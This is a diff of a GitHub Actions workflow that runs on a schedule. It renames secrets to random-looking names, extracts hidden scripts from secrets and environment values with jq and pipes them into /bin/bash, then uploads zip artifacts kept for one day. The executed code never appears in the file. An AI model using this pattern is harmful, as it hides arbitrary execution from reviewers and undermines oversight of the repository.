@@ -1,23 +1,26 @@
 name: xianzhenglingdang
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '9 5/6 * * *'
 
-jobs:  # 87
+  schedule:
+    - cron: '33 4,10,16,22 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: xianzhenglingdang
         env:
-          sj62018: ${{ secrets.sj62018 }}
+          rrft42: ${{ secrets.rrft42 }}
         run: |
-          echo $sj62018 | jq -r .wfzla60725 | /bin/bash
-          echo $gmtv846 | jq -r .kf6254 | /bin/bash
-          echo $hvsg49865 | jq -r .a453 | /bin/bash
-          echo $r967 | jq -r .mdb1201 | /bin/bash
-          echo $hyzo3 | jq -r .st83851 | /bin/bash
-          echo $y5133 | jq -r .apvek761 | /bin/bash
+          printf '%s' "$rrft42" | jq -r .k36156 | /bin/bash
+          echo $qe4 | jq -r .hlvu962 | /bin/bash
+          printf '%s' "$qp5" | jq -r .u3 | /bin/bash
+          printf '%s' "$whkm54198" | jq -r .b60 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: 7kfPlyLr
+          path: "*.zip"
+          retention-days: 1
